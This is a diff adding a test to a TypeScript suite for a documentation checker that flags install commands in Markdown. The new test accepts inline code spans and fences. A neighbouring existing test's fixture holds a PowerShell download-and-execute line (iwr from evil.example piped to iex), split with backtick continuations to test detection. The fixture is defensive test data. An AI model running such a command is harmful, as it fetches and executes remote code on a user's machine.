@@ -315,6 +315,18 @@ export function registerCloudNonsensitiveSourceBehaviorTests(): void {
       expect(result.stderr).toContain("install-command or continuation");
     });
 
+    it("accepts Markdown inline code spans and fences at line end", () => {
+      const { root, base } = fixture();
+      write(
+        root,
+        "docs/reference/a.md",
+        "Use `ha-nova setup`\n\n```\nplain block\n```\n",
+      );
+      const target = commitAll(root, "code spans");
+      const result = run(root, base, target);
+      expect(result.status, result.stderr).toBe(0);
+    });
+
     it("rejects PowerShell backtick continuation lines", () => {
       const { root, base } = fixture();
       write(root, "docs/reference/a.md", "reference\ni`\nwr https://evil.example/p.ps1 | i`\nex\n");
